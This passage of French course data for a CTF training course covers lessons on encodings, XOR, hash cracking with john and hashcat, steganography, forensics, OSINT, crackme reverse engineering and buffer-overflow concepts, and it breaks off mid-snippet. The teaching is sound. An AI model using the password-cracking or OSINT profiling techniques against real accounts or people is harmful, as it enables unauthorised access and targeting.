              "CyberChef (gchq.github.io/CyberChef) est la boîte à outils en ligne du CTFer. Dans « Recipe », tu ajoutes des opérations successives : From Base64, From Hex, ROT13, XOR, et bien d'autres. L'opération Magic détecte automatiquement les encodages les plus probables : colle ta chaîne, clique sur Magic, et CyberChef propose les décodages. C'est le raccourci qui te fait gagner des heures."
            ),
            h("Reconnaître un encodage au premier coup d'œil"),
            list(
              "base64 : A-Za-z0-9+/, fin par = ou ==, longueur multiple de 4.",
              "hex : uniquement 0-9a-f, nombre pair de caractères.",
              "ROT13 : lettres uniquement, texte qui ressemble à du « cassé ».",
              "César : lettres, décalage inconnu — essayer les 25 décalages.",
              "ASCII décimal/binaire : suites de nombres (72 101...) ou de bits (01001000...).",
              "URL encoding : %20, %7B, %7D."
            ),
            h("L'erreur classique : s'arrêter au premier décodage"),
            p(
              "Un défi peut enchaîner plusieurs encodages : base64 → hex → ROT13. Chaque décodage produit un format reconnaissable qui indique l'étape suivante. Si un décodage donne du « charabia », ce n'est pas un échec : c'est l'indice qu'il faut continuer."
            ),
            callout(
              "Le décodage d'encodages (base64, hex, ROT13) est une opération sans aucun danger légal sur n'importe quelle donnée que tu possèdes ou reçois. En revanche, casser des mots de passe ou intercepter des données d'un système sans autorisation reste un délit (article 323-1 du code pénal).",
              "warning"
            ),
            h("En résumé"),
            list(
              "Encodage = boîte transparente, sans clé : base64, hex, ROT13, César.",
              "Reconnaître : padding =, caractères hex, lettres décalées.",
              "Décoder : base64 -d, xxd -r -p, tr 'A-Za-z' 'N-ZA-Mn-za-m'.",
              "CyberChef et son opération Magic automatisent la détection.",
              "Ne jamais s'arrêter au premier décodage : les cascades existent."
            )
          ]
        },
        {
          id: "ctf-lecon-09",
          title: "Crypto — XOR, hachage et hashcat/john",
          type: "exercise",
          duration: "20 min",
          blocks: [
            h("Le XOR, le couteau suisse du CTFer"),
            p(
              "Le XOR (ou exclusif, symbole ^) est une opération binaire qui devient le chiffrement le plus présent en CTF. Sa propriété magique : appliquer deux fois la même clé redonne la donnée originale. (a XOR k) XOR k = a. Pour déchiffrer, on réapplique la même clé. C'est une opération symétrique et involutive."
            ),
            h("Un XOR pas à pas"),
            p(
              "Tu sais qu'un message a été XORé octet par octet avec la clé 0x42. Le résultat chiffré est 0a 07 0e 0e 0d. On réapplique la clé : 0a^0x42=0x48='H', 07^0x42=0x45='E', 0e^0x42=0x4c='L', 0e^0x42='L', 0d^0x42=0x4f='O'. Le message est HELLO."
            ),
            code(`python3 -c "print(bytes([b ^ 0x42 for b in bytes.fromhex('0a070e0e0d')]).decode())"
# Sortie : HELLO`),
            h("Le hachage : une empreinte, pas un chiffrement"),
            p(
              "Un hash (hachage) transforme une donnée en une empreinte de taille fixe, non réversible. md5, sha1, sha256 sont des algorithmes de hachage. On ne « déchiffre » pas un hash : on teste des candidats et on compare leurs empreintes. Le hash est comme l'empreinte digitale : elle identifie, mais tu ne peux pas reconstruire la personne à partir de l'empreinte."
            ),
            list(
              "MD5 : 32 caractères hexadécimaux.",
              "SHA-1 : 40 caractères hexadécimaux.",
              "SHA-256 : 64 caractères hexadécimaux.",
              "Vérifier avec hashid -m -j pour confirmer le type exact."
            ),
            h("Identifier le type de hash avec hashid"),
            p(
              "Tu reçois un fichier hash.txt contenant une ligne de 32 caractères hexadécimaux. Tu ne sais pas quel algorithme a produit cette empreinte. hashid l'analyse et propose les algorithmes possibles, avec le mode Hashcat (-m) et le format John (-j)."
            ),
            code(`hashid -m -j hash.txt
# Analyzing '482c811da5d5b4bc6d497ffa98491e38'
# [+] MD5 [Hashcat Mode: 0][JtR Format: raw-md5]`),
            h("Casser le hash avec john"),
            p(
              "John the Ripper casse le hash par attaque par dictionnaire : il hache chaque mot de la liste et compare les empreintes. Le fichier rockyou.txt contient des millions de mots de passe réels, il est livré avec Kali Linux."
            ),
            code(`john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Loaded 1 password hash (Raw-MD5 ...)
# password123      (?)

john --show --format=raw-md5 hash.txt
# ?:password123`),
            h("L'alternative hashcat"),
            p(
              "hashcat utilise le GPU pour être beaucoup plus rapide. Même principe : un mode (0 pour MD5), une attaque (-a 0 pour dictionnaire), une wordlist."
            ),
            code(`hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`),
            h("Les erreurs fréquentes avec john"),
            list(
              "« No password hashes loaded » : le format n'est pas spécifié — relance hashid -j et utilise exactement le format affiché.",
              "« Could not open file » : rockyou.txt est compressé sous Kali — lance sudo gunzip /usr/share/wordlists/rockyou.txt.gz.",
              "john tourne longtemps sans résultat : le type de hash est faux — revérifie avec hashid, teste plusieurs formats.",
              "Un mot bizarre incluant un saut de ligne : le fichier contient un \\n parasite — crée le fichier avec echo -n ou nettoie avec tr -d '\\n'."
            ),
            h("Le RSA en un coup d'œil"),
            p(
              "RSA est un chiffrement asymétrique : une clé publique chiffre, une clé privée déchiffre. En CTF, les défis RSA « faciles » exploitent une erreur de conception : un n trop petit (factorisable), un exposant spécial, ou deux messages chiffrés avec la même clé. Lire une clé publique :"
            ),
            code(`openssl rsa -pubin -in public.pem -text -noout`),
            p(
              "La sortie affiche le modulus (n) et le publicExponent (e). Si n est petit, la factorisation devient possible avec Python ou l'outil dédié RsaCtfTool."
            ),
            h("La méthodologie crypto en cinq étapes"),
            list(
              "Observer la donnée : quelle est sa forme ? lettres, hex, base64, octets binaires ?",
              "Identifier : essayer les décodages simples dans l'ordre (base64, hex, ROT13). CyberChef Magic automatise.",
              "Si c'est un hash : hashid pour connaître le type, puis john/hashcat.",
              "Si c'est un chiffrement avec clé : chercher la clé dans l'énoncé, le nom du fichier ou les indices.",
              "Soumettre le flag au format exact."
            ),
            callout(
              "Les attaques de cette leçon (casser un hash, déchiffrer un XOR) s'exercent sur des fichiers que tu crées ou des challenges de plateformes autorisées. Casser le hash d'un mot de passe réel sans autorisation, ou déchiffrer des données qui ne t'appartiennent pas, est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "XOR : réversible en réappliquant la même clé : (a XOR k) XOR k = a.",
              "Hash : empreinte irréversible, identifiée par hashid, cassée par john/hashcat.",
              "MD5 = 32 hex, SHA-1 = 40, SHA-256 = 64.",
              "Tester l'encodage avant le chiffrement : base64, hex, ROT13 couvrent 70 % des défis faciles."
            )
          ]
        },
        {
          id: "ctf-lecon-10",
          title: "Stéganographie — voir l'invisible",
          type: "exercise",
          duration: "20 min",
          blocks: [
            h("L'art de cacher dans le visible"),
            p(
              "La stéganographie (stego) est l'art de cacher des données dans d'autres données : un message dans une image, un fichier à la fin d'un autre fichier, du texte dans un fichier audio. L'objectif n'est pas de chiffrer mais de dissimuler : personne ne doit se douter que le secret existe. Si le chiffrement est un coffre-fort visible mais impossible à ouvrir, la stéganographie est une pièce secrète derrière un mur."
            ),
            h("Le piège de l'extension"),
            p(
              "La première leçon : ne jamais se fier à l'extension d'un fichier. Un .jpg peut être un ZIP, un .png un PDF. file lit les signatures (les octets magiques) du contenu, pas l'extension. C'est la première commande de toute analyse."
            ),
            code(`file defi.png
# defi.png: PNG image data, 8 x 8, 8-bit/color RGB, non-interlaced`),
            h("strings : chercher le texte en clair"),
            p(
              "strings extrait les séquences de caractères imprimables. L'option -n 6 ignore les chaînes de moins de 6 caractères pour réduire le bruit. Le flag est très souvent là, en clair, dans un fichier qu'on croyait binaire."
            ),
            code(`strings -n 6 defi.png`),
            h("binwalk : détecter les fichiers emboîtés"),
            p(
              "binwalk analyse un fichier à la recherche de signatures de formats connus (ZIP, PNG, JPEG, PDF). Un organisateur peut coller un ZIP à la fin d'une image : l'image s'ouvre toujours normalement, mais la signature du ZIP est détectable."
            ),
            code(`binwalk defi.png
# DECIMAL  HEXADECIMAL  DESCRIPTION
# 0        0x0          PNG image, 8 x 8, 8-bit/color RGB
# 74       0x4A         Zip archive data ... name: flag.txt`),
            p(
              "La ligne Zip archive data à l'offset 0x4A révèle qu'un ZIP nommé avec flag.txt est collé dans l'image. L'option -e (extract) désassemble automatiquement les fichiers trouvés dans un dossier _nom.extracted."
            ),
            code(`binwalk -e defi.png
cat _defi.png.extracted/flag.txt
# flag{Emb3dded_ZIP}`),
            h("exiftool : lire les métadonnées"),
            p(
              "exiftool affiche les informations techniques d'un fichier image : commentaire, auteur, titre, coordonnées GPS. Les champs Comment, Artist, Author, Title, GPS peuvent contenir le flag ou des indices. C'est une étape obligatoire même quand l'image « a l'air normale »."
            ),
            code(`exiftool photo.jpg
exiftool -Comment photo.jpg
# Comment: flag{c4m_3xc3ll3nt3}`),
            h("steghide : les données cachées dans l'image"),
            p(
              "steghide cache et extrait des données dans des images ou des sons, protégées par une passphrase. L'étape info liste le contenu caché ; l'étape extract l'extrait. Piège classique : steghide refuse d'extraire si la passphrase est fausse, mais accepte la passphrase vide (touche Entrée) — c'est le cas le plus fréquent dans les défis faciles."
            ),
            code(`steghide info photo.jpg
# steghide: the file photo.jpg does contain the file flag.txt

steghide extract -sf photo.jpg
# (passphrase vide : touche Entrée)
cat flag.txt`),
            h("Le LSB : la technique reine"),
            p(
              "Le LSB (Least Significant Bit, bit de poids faible) est le dernier bit d'un octet. Une image est une suite de pixels, chaque pixel a des valeurs de couleur Rouge, Vert, Bleu. En modifiant le bit de poids faible de chaque octet, on change la couleur imperceptiblement (±1 sur 256 niveaux) — mais on peut y stocker un message : chaque octet du message utilise 8 pixels. L'œil humain ne voit rien, mais l'outil zsteg lit les bits."
            ),
            code(`zsteg image.png`),
            h("La stéganographie audio"),
            p(
              "Les fichiers audio peuvent cacher un message dans leur spectrogramme : une image (souvent un texte) visible dans la représentation spectrale du son. L'analyse se fait avec Audacity ou Sonic Visualiser. Un fichier WAV ou MP3 dans un défi est un indice à creuser."
            ),
            h("Les archives protégées"),
            p(
              "Si le fichier extrait est un ZIP protégé par mot de passe, on casse la protection : zip2john convertit l'archive en hash que john attaque par dictionnaire."
            ),
            code(`zip2john archive.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
unzip -P motdepasse archive.zip`),
            h("La pyramide de la stéganographie"),
            list(
              "file : quel type de fichier ?",
              "strings : des données en clair ?",
              "exiftool : des métadonnées ?",
              "binwalk / binwalk -e : des fichiers emboîtés ?",
              "zsteg (PNG/BMP) ou steghide info (JPEG) : de la stégo LSB ou cachée ?",
              "Si audio : spectrogramme avec Audacity.",
              "Si fichier extrait protégé : zip2john + john."
            ),
            callout(
              "Toutes les techniques de cette leçon s'exercent sur des fichiers que tu crées ou des challenges des plateformes autorisées (Root-Me, TryHackMe, picoCTF). Extraire des données cachées d'un fichier ou d'un système qui ne t'appartient pas sans autorisation est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "La stégo cache des données : fichiers emboîtés, LSB, métadonnées, spectrogrammes.",
              "file révèle la vraie nature, strings cherche le texte, exiftool lit les métadonnées.",
              "binwalk -e extrait les fichiers emboîtés, steghide extrait les données cachées, zsteg lit le LSB.",
              "zip2john + john cassent les archives protégées.",
              "Toujours tester la passphrase vide de steghide en premier."
            )
          ]
        },
        {
          id: "ctf-lecon-11",
          title: "Forensics — captures et mémoire",
          type: "exercise",
          duration: "20 min",
          blocks: [
            h("L'inspecteur de la police scientifique"),
            p(
              "La catégorie Forensics (informatique légale) consiste à analyser des traces : un fichier, une image disque, une capture réseau (pcap), un extrait de mémoire RAM. Le flag est caché dans les données, souvent parce que l'organisateur l'a « perdu » quelque part. Le forensicien est comme un inspecteur de police scientifique : il n'attaque personne, il examine la scène de crime pour y trouver les indices que d'autres ont laissés."
            ),
            h("Les quatre grands types de défis Forensics"),
            list(
              "Fichier suspect : un PDF, une image, un document — réflexe file, strings, binwalk, exiftool.",
              "Capture réseau (pcap) : un enregistrement de trafic — réflexe tshark, tcpdump, strings.",
              "Image mémoire (RAM) : un dump de la mémoire d'un ordinateur — réflexe Volatility.",
              "Métadonnées : informations cachées dans un fichier — réflexe exiftool."
            ),
            h("La pyramide Forensics"),
            p(
              "La méthode fonctionne comme un entonnoir : on part des outils les moins chers vers les plus spécifiques, chaque étape répond à une question précise. Sauter des étapes fait perdre des informations."
            ),
            code(`1. file fichier        → quelle est la vraie nature ?
2. strings -n 6 fichier → y a-t-il du texte lisible ?
3. exiftool fichier     → y a-t-il des métadonnées ?
4. binwalk fichier      → y a-t-il des signatures ?
5. binwalk -e fichier   → que contient le dossier extrait ?
6. outils dédiés        → pcap, mémoire, archives…`),
            h("Le duo strings + binwalk"),
            p(
              "Ce duo résout une très large part des défis Forensics faciles. strings cherche les chaînes lisibles (avec -n 6 pour réduire le bruit), binwalk détecte les fichiers emboîtés par leurs signatures. Le flag peut être dans une chaîne courte : essaie aussi strings sans -n, et vérifie la fin du fichier avec tail -c 200."
            ),
            code(`strings defi.bin
strings -n 6 defi.bin
strings -e l defi.bin    # chaînes UTF-16 (Windows)
tail -c 200 defi.bin`),
            h("Analyser une capture réseau"),
            p(
              "Une capture pcap est un enregistrement binaire du trafic réseau. tshark (la version ligne de commande de Wireshark) donne la vue d'ensemble, -Y filtre le trafic, tcpdump -r -A affiche le contenu en ASCII. Le flag passe souvent en clair sur HTTP non chiffré."
            ),
            code(`tshark -r capture.pcap
tshark -r capture.pcap -Y "http"
tcpdump -r capture.pcap -A
strings capture.pcap | grep -i flag`),
            h("Le réflexe sur un pcap"),
            p(
              "Le réflexe : tshark -r capture.pcap pour la vue d'ensemble, puis tshark -r capture.pcap -Y \\\"http\\\" pour ne garder que le trafic HTTP, puis strings pour chercher le flag directement. Le flag d'un défi pcap est souvent dans la réponse HTTP à un GET /flag.txt."
            ),
            code(`# Exemple de sortie tshark
# 4   0.002616 192.168.1.20 → 192.168.1.10 HTTP 124 GET /flag.txt HTTP/1.1
# 5   0.003877 192.168.1.10 → 192.168.1.20 TCP 139 HTTP/1.1 200 OK

# Et le corps de la réponse :
# FLAG{p4ck3t_4n4lyst}`),
            h("La mémoire avec Volatility"),
            p(
              "Une image mémoire (.raw, .mem, .dump) est une copie de la RAM d'un ordinateur, capturée pendant son fonctionnement. Elle contient les processus, les fichiers ouverts, les mots de passe en clair. Volatility, framework open-source d'analyse mémoire, l'explore."
            ),
            code(`volatility -f mem.raw imageinfo
volatility -f mem.raw --profile=Win7SP1x64 pslist
volatility -f mem.raw --profile=Win7SP1x64 filescan
volatility -f mem.raw --profile=Win7SP1x64 memdump -p 1234 -D ./`),
            list(
              "imageinfo : détecte le système d'exploitation et le profil.",
              "pslist : liste les processus en cours.",
              "filescan : retrouve les fichiers présents en mémoire.",
              "memdump -p PID : extrait la mémoire d'un processus précis, qu'on analyse ensuite avec strings."
            ),
            h("Le cas réel — le fichier conteneur"),
            p(
              "Un défi fournit evidence.bin. L'énoncé : « Le technicien a laissé plusieurs indices dans le fichier. Un seul contient le flag. » Le mot « plusieurs indices » oriente vers un conteneur : plusieurs fichiers emboîtés. On suit la pyramide : file (data), strings (rien), exiftool (non pertinent), binwalk (un PNG et un ZIP détectés), binwalk -e (image.png et secret.zip), exiftool -Comment image.png (flag{metadata_win}), et zip2john + john sur secret.zip (mot de passe trouvé, second flag dedans)."
            ),
            h("Bonnes pratiques Forensics"),
            list(
              "Toujours essayer strings avec -n 6 puis sans -n : le flag peut être dans une chaîne courte.",
              "Vérifier la fin du fichier (tail -c 200) : les flags y sont souvent collés.",
              "Noter les offsets (la colonne DECIMAL de binwalk) : ils montrent où commence chaque élément.",
              "Le contenu extrait peut être lui-même chiffré ou encodé : applique la méthode Crypto ensuite."
            ),
            callout(
              "L'analyse de fichiers et de captures s'exerce sur des fichiers que tu crées, des challenges des plateformes autorisées, ou des machines que tu possèdes. Analyser des données volées ou une capture réalisée sans autorisation est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "Forensics = analyse de traces : file, strings, exiftool, binwalk, tshark, tcpdump, Volatility.",
              "La pyramide file → strings → exiftool → binwalk est le réflexe de base.",
              "Les captures pcap se lisent avec tshark et tcpdump ; le flag est souvent en clair dans HTTP.",
              "Volatility explore les images mémoire : imageinfo, pslist, filescan, memdump."
            )
          ]
        },
        {
          id: "ctf-lecon-12",
          title: "OSINT et Misc — l'ingénierie ouverte",
          type: "theory",
          duration: "16 min",
          blocks: [
            h("Le détective des informations publiques"),
            p(
              "OSINT (Open Source INTelligence, renseignement en sources ouvertes) est la collecte et la corrélation d'informations publiques : sites web, réseaux sociaux, photos, registres, bases de données. En CTF, un défi OSINT te donne une photo, un pseudonyme ou un lieu, et tu dois trouver le flag grâce à la recherche. C'est le travail du détective dans un roman policier : chaque indice public est une pièce d'un puzzle que tu reconstruis en les croisant."
            ),
            h("La recherche inversée d'images"),
            p(
              "Tu reçois une photo et tu veux savoir où elle apparaît ailleurs sur le web. Google Images (icône appareil photo), TinEye et Yandex Images acceptent un fichier et renvoient les pages où cette image apparaît. Leurs index diffèrent : teste plusieurs moteurs."
            ),
            h("La géolocalisation"),
            p(
              "Pour situer un lieu à partir d'une photo : énumère les indices visuels (panneaux, relief, langue, horloges, plaques d'immatriculation), puis croise avec Google Maps et Street View. Une horloge sur un bâtiment, une langue sur un panneau, un style d'architecture : chaque détail compte. Le flag est souvent le nom de la rue ou les coordonnées GPS."
            ),
            h("Les métadonnées comme source OSINT"),
            p(
              "Une photo peut contenir ses propres informations : auteur, date, coordonnées GPS, programme utilisé. exiftool les lit directement. Un défi OSINT combine souvent la recherche visuelle et la lecture des métadonnées."
            ),
            code(`exiftool photo.jpg
exiftool -GPSLatitude photo.jpg
exiftool -Comment photo.jpg`),
            h("Retrouver un pseudonyme : sherlock"),
            p(
              "sherlock teste la présence d'un pseudonyme sur des centaines de plateformes et liste celles où il existe. En CTF, cela peut te mener vers un profil contenant le flag ou un indice."
            ),
            code(`sherlock pseudonyme`),
            h("Collecter des informations sur un domaine"),
            p(
              "theHarvester collecte les emails, sous-domaines et technologies associés à un domaine. crt.sh (les certificats SSL enregistrés publiquement) révèle des sous-domaines oubliés. La Wayback Machine (web.archive.org) montre les versions passées d'un site : un contenu supprimé reste parfois archivé."
            ),
            code(`theHarvester -d exemple.com -b all`),
            h("La méthodologie OSINT"),
            list(
              "Lire l'énoncé : qu'est-ce qu'on te demande ? trouver un lieu, une personne, un site ?",
              "Énumérer les indices : chaque élément visible ou texte est un indice.",
              "Recherche inversée d'images si tu as une photo.",
              "Corréler : croiser les indices (lieu + personne + date).",
              "Vérifier avec Google Maps ou Street View avant de soumettre le flag."
            ),
            h("La catégorie Misc — tout le reste"),
            p(
              "Misc (miscellaneous, « divers ») regroupe tout ce qui ne rentre pas ailleurs : programmation, jeux, encodages, QR codes, culture, logique. C'est la salle « hors catégorie » du musée : elle peut contenir n'importe quoi, et elle teste ta créativité et ta persévérance."
            ),
            h("Les sous-catégories fréquentes du Misc"),
            list(
              "Programmation : écrire un script qui interagit avec un service (calculs répétés, robots) — Python et pwntools.",
              "QR codes : lire un code QR avec zbarimg.",
              "Encodages en chaîne : une donnée encodée plusieurs fois (base64 → hex → ROT13) — CyberChef, répéter.",
              "Jeux : contrôler un robot, gagner à un mini-jeu — automatiser ou trouver le flag directement dans la page.",
              "Culture et logique : énigmes, anagrammes, références — l'énoncé est l'indice, chaque mot compte.",
              "Fichiers étranges : extension bizarre, format inattendu — file révèle la vraie nature.",
              "Compression : fichier dans un fichier dans un fichier — file, binwalk, décompression répétée."
            ),
            h("Le challenge d'automatisation classique"),
            p(
              "Un serveur pose « 3 + 5 = ? » et répète la question 100 fois. Répondre à la main est impossible. Un script Python lit la question, calcule, envoie la réponse, et répète. Au bout du compte, le serveur envoie le flag."
            ),
            code(`from pwn import *

p = remote("challenge.ctf", 1337)
for _ in range(100):
    ligne = p.recvline().decode()
    a, b = map(int, ligne.strip(" =?\\n").split(" + "))
    p.sendline(str(a + b))
p.interactive()`),
            h("Bonnes pratiques OSINT et Misc"),
            list(
              "Noter tous les indices même anodins : le flag combine souvent plusieurs éléments.",
              "Tester la recherche inversée sur plusieurs moteurs : leurs index diffèrent.",
              "L'OSINT exige de la patience : un indice à la fois, la précision vient en croisant les sources.",
              "En Misc, la simplicité gagne : vérifie que le flag n'est pas en clair dans la page avant de chercher complexe.",
              "Automatiser dès que la tâche est répétitive : c'est un travail de programmation, pas de patience."
            ),
            callout(
              "Les techniques OSINT s'exercent sur des informations publiques, ce qui est légal — mais les croiser pour harceler, usurper ou cibler une personne est illégal. Et en Misc comme partout, on automatise et on teste uniquement sur les plateformes autorisées : hors de ce cadre, c'est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "OSINT = renseignement en sources ouvertes : recherche inversée d'images, réseaux sociaux, géolocalisation, métadonnées, archives web.",
              "Outils : Google Images/TinEye/Yandex, exiftool, sherlock, theHarvester, Wayback Machine.",
              "Misc = tout le reste : programmation, QR codes, encodages en chaîne, jeux, logique.",
              "Réflexe Misc : lire l'énoncé trois fois, identifier le type, automatiser avec Python, décoder avec CyberChef."
            )
          ]
        },
      ],
    },
    {
      id: "ctf-module-3",
      title: "Reverse, pwn, networking, privesc et challenges chaînés",
      lessons: [
        {
          id: "ctf-lecon-13",
          title: "Reverse engineering basique — strings, objdump, gdb",
          type: "exercise",
          duration: "22 min",
          blocks: [
            h("Lire une montre fermée"),
            p(
              "Le Reverse Engineering (RE, ingénierie inverse) consiste à comprendre ce que fait un programme sans avoir son code source. Tu disposes d'un binaire (un fichier exécutable) et tu dois découvrir son comportement, son mot de passe, son algorithme — pour récupérer le flag. C'est comme recevoir une montre mécanique fermée : sans plan, tu dois l'ouvrir, observer les engrenages et comprendre comment elle fonctionne."
            ),
            h("Pourquoi c'est important"),
            p(
              "Les analystes de malwares décompilent les programmes malveillants pour comprendre leur fonctionnement, les équipes de sécurité inspectent les binaires suspects, et les chercheurs vérifient qu'un logiciel ne fait pas ce qu'il prétend. En CTF, le RE est aussi la porte d'entrée du Pwn : on ne peut pas exploiter un programme qu'on ne comprend pas."
            ),
            h("La chaîne d'analyse complète"),
            p(
              "Tu reçois un crackme (un programme « devine le mot de passe ») qui affiche « Usage: ./crackme <mot-de-passe> ». Tu dois trouver le mot de passe pour que le programme imprime le flag. Voici la méthode, étape par étape."
            ),
            h("Étape 1 — Identifier le binaire"),
            code(`file crackme
# crackme: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped`),
            p(
              "C'est un ELF (Executable and Linkable Format) 64 bits pour x86-64. « not stripped » signifie que les symboles (noms de fonctions) sont encore présents : une aubaine pour toi."
            ),
            h("Étape 2 — strings : les indices visibles"),
            code(`strings -n 6 crackme
# Usage: %s <mot-de-passe>
# Bien joue, flag accepte !
# Echec, reessaie...`),
            p(
              "Trois messages, mais aucun mot de passe en clair : il est obfusqué (caché) dans le code. strings seul ne suffit pas — il faut lire le code."
            ),
            h("Étape 3 — nm : lister les fonctions"),
            code(`nm crackme
# 0000000000001159 T check_password
# 00000000000011d4 T main`),
            p(
              "Il existe une fonction check_password (vérifier le mot de passe) : c'est là que tout se joue. Les noms de fonctions parlants (check_password, print_flag, win) sont des cadeaux : ne jamais passer directement au désassemblage complet."
            ),
            h("Étape 4 — objdump : lire le désassemblage"),
            code(`objdump -d crackme | sed -n '/<check_password>:/,/<main>:/p'`),
            p(
              "La sortie montre le code assembleur : des instructions comme mov (déplacer), cmp (comparer), je/jne (sauter si égal / si différent), xor (ou exclusif). La logique de vérification apparaît comme une série de comparaisons."
            ),
            code(`1165:  c7 45 f5 13 19 14 12    movl $0x12141913,-0xb(%rbp)   ; octets: 13 19 14 12
116c:  c7 45 f8 12 05 02 1b    movl $0x1b020512,-0x8(%rbp)   ; octets: 12 05 02 1b
117a:  e8 ...                  call strlen@plt
117f:  48 83 f8 07             cmp $0x7,%rax                 ; mot de passe de 7 lettres
11a2:  0f b6 00                movzbl (%rax),%eax            ; lit le caractère
11a5:  83 f0 55                xor $0x55,%eax                ; XOR avec 0x55  ← la clé
11b8:  39 c2                   cmp %eax,%edx                 ; compare avec l'octet attendu`),
            p(
              "La fonction stocke un tableau d'octets : 13 19 14 12 05 02 1B. Pour chaque caractère du mot de passe, elle applique xor $0x55,%eax (un « ou exclusif » avec la valeur hexadécimale 0x55) puis compare le résultat au tableau. Le mot de passe est donc : chaque octet du tableau XORé avec 0x55."
            ),
            h("Étape 5 — Calculer le mot de passe"),
            code(`python3 -c "print(bytes([b ^ 0x55 for b in [0x13,0x19,0x14,0x12,0x05,0x02,0x1b]]).decode())"
# FLAGPWN`),
            h("Étape 6 — Vérifier"),
            code(`./crackme FLAGPWN
# Bien joue, flag accepte !`),
            h("Étape 7 (optionnelle) — gdb, le débogueur"),
            p(
              "gdb (GNU Debugger) permet de lancer le programme en contrôlant son exécution : points d'arrêt, registres, pas à pas. C'est la preuve vivante de l'analyse objdump."
            ),
            code(`gdb -q ./crackme
(gdb) info functions
(gdb) disassemble check_password
(gdb) break check_password
(gdb) run FLAGPWN
(gdb) stepi
(gdb) info registers`),
            list(
              "info functions : liste les fonctions du programme.",
              "disassemble <nom> : désassemble une fonction.",
              "break main : pose un point d'arrêt au début de main.",
              "run <arguments> : lance le programme avec des arguments.",
              "stepi / nexti : avance d'une instruction.",
              "x/s <adresse> : affiche la chaîne à une adresse.",
              "info registers : affiche les registres du processeur.",
              "quit : quitte gdb."
            ),
            h("ltrace et strace — les raccourcis"),
            p(
              "Avant gdb, deux outils d'observation valent de l'or. ltrace enregistre les appels aux bibliothèques : il montre les appels à strcmp (comparaison de chaînes), ce qui révèle parfois le mot de passe comparé. strace enregistre les appels système : il montre les fichiers ouverts, les lectures, les écritures."
            ),
            code(`ltrace ./crackme FLAGPWN
strace ./crackme FLAGPWN`),
            h("Les décompilateurs — le raccourci moderne"),
            p(
              "Les décompilateurs traduisent le binaire en pseudo-code proche du langage original. Ghidra (développé par la NSA, gratuit) et l'outil en ligne dogbolt.org (qui agrège plusieurs décompilateurs) te donnent une vue « presque source » du programme. Pour un crackme simple, un décompilateur en ligne suffit : tu vois directement la comparaison du mot de passe."
            ),
            h("Les pièges du RE"),
            list(
              "Se limiter à strings : le mot de passe est obfusqué — passer à nm puis objdump.",
              "Lire les octets en désordre : le x86 stocke en petit-boutiste (octets inversés dans les mots) — recopier les octets dans l'ordre d'écriture.",
              "Chercher une clé compliquée : c'est souvent un simple XOR, visible directement dans l'instruction xor $0x55.",
              "Oublier la longueur : la fonction vérifie parfois strlen == 7 — vérifier la comparaison cmp."
            ),
            callout(
              "L'analyse de binaires s'exerce sur des crackmes de plateformes autorisées (Root-Me, TryHackMe, picoCTF) ou des programmes que tu compiles toi-même. Analyser ou rétro-ingénierier un logiciel que tu n'es pas autorisé à analyser peut violer des licences et des lois : article 323-1 du code pénal pour toute manipulation non autorisée.",
              "danger"
            ),
            h("En résumé"),
            list(
              "RE = lire un programme sans son code : file, strings, nm, objdump -d, gdb, Ghidra.",
              "Toujours strings en premier : le flag est très souvent en clair.",
              "Lire le nom des fonctions : check_password, print_flag, win sont des cadeaux.",
              "Pour un crackme, le mot de passe se trouve dans les comparaisons (cmp) et les XOR.",
              "ltrace et strace observent les appels du programme sans le désassembler."
            )
          ]
        },
        {
          id: "ctf-lecon-14",
          title: "Pwn — le buffer overflow en concepts",
          type: "theory",
          duration: "18 min",
          blocks: [
            h("Faire déborder le verre"),
            p(
              "Pwn (argot internet dérivé de « own », « posséder ») est la catégorie des défis d'exploitation de vulnérabilités mémoire : il faut faire exécuter à un programme un comportement qu'il ne devrait pas avoir (ouvrir un shell, appeler une fonction cachée, lire un fichier). Le défaut classique est le buffer overflow (débordement de tampon)."
            ),
            p(
              "Imagine un verre (le tampon) posé au bord d'une table. On te demande de verser de l'eau (des données) dedans. Si tu verses trop, l'eau déborde sur la table et coule sur les objets posés derrière (les données du programme). Si tu verses très précisément, tu peux faire basculer ce qui se trouve derrière et changer le comportement du programme."
            ),
            h("Pourquoi c'est important"),
            p(
              "Les vulnérabilités mémoire (buffer overflow, format string, use-after-free) ont permis les plus grandes attaques de l'histoire. Même si les langages modernes protègent mieux, de nombreux systèmes critiques tournent toujours en C/C++ — et les attaquants ciblent leurs failles. Comprendre Pwn, c'est comprendre pourquoi les développeurs doivent écrire du code sûr."
            ),
            h("Les protections — checksec d'abord"),
            p(
              "Avant de penser à exploiter, on vérifie les protections du binaire avec checksec (fourni par pwntools). Ces protections déterminent toute la stratégie : sans cette vérification, tu construis un payload à l'aveugle."
            ),
            list(
              "ASLR (Address Space Layout Randomization) : adresses mémoire aléatoires à chaque exécution — impossible de les prévoir au hasard.",
              "NX (No-eXecute) : la pile n'est pas exécutable — impossible d'exécuter un shellcode (code machine) placé sur la pile.",
              "Canary : une valeur « sentinelle » détecte les débordements — le programme se termine si la sentinelle est écrasée.",
              "PIE (Position Independent Executable) : le binaire est chargé à une adresse aléatoire — les adresses internes sont aléatoires."
            ),
            code(`checksec crackme
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)`),
            h("Le défi pédagogique ret2win"),
            p(
              "Pour débuter, les plateformes créent des défis sans ASLR/PIE : une fonction win() (qui imprime le flag) existe déjà dans le programme, et il suffit de rediriger l'exécution vers elle en écrasant la pile. C'est le défi classique « ret2win » (retour vers win). Le but est pédagogique : tu modifies l'adresse de retour pour sauter dans la fonction win(), sans aucune destruction."
            ),
            h("pwntools — la bibliothèque Python du pwn"),
            p(
              "pwntools automatise l'interaction avec les programmes et les réseaux : lancer un binaire local, se connecter à un service distant, envoyer et recevoir des données, générer des motifs de débordement."
            ),
            code(`from pwn import *

p = process("./crackme")            # lancer un programme local
p = remote("challenge.ctf", 1337)   # se connecter à un service distant
